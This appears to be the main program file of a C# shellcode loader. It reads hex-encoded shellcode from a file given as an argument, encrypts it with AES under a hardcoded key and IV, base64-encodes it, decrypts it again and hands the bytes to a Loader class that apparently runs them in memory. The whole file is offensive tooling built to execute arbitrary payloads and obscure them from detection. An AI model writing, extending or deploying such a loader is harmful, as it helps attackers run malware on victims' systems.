using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace shell_code_loader
{
    internal class Program
    {
        public static byte[] key = new byte[] { 0x33, 0xED, 0x8A, 0x15, 0xD9, 0x26, 0xC5, 0x1C, 0x95, 0xF1, 0x4C, 0x11, 0xE4, 0x37, 0xD4, 0x5B, 0xE8, 0xDD, 0x8E, 0xED, 0xDC, 0x01, 0x38, 0xC7 };
        public static byte[] iv = new byte[] { 0x2B, 0x6F, 0xD1, 0xE3, 0x59, 0x6F, 0xC3, 0x31, 0x62, 0xC9, 0x98, 0x55, 0x7B, 0x00, 0xCB, 0xD1 };

        static void Main(string[] args)
        {
            if (args.Length == 1)
            {
                if (!File.Exists($@"{args[0]}"))
                {
                    Console.WriteLine("Give a file as parameter !");
                    Environment.Exit(1);
                }

                String fileData = System.IO.File.ReadAllText($@"{args[0]}");
                String tmp = (fileData.Split('{')[1]).Split('}')[0];

                string[] s = tmp.Split(',');
                byte[] data = new byte[s.Length];

                for (int i = 0; i < data.Length; i++)
                    data[i] = byte.Parse(s[i].Replace("0x", ""), System.Globalization.NumberStyles.HexNumber);

                byte[] e_data = Crypt.Encrypt(data, key, iv);
                String finalPayload = Convert.ToBase64String(e_data);
                byte[] de_data = Crypt.Decrypt(Convert.FromBase64String(finalPayload), key, iv);
                Loader.load(de_data);
            }
            else
            {
                Environment.Exit(1);
            }
        }
    }
}
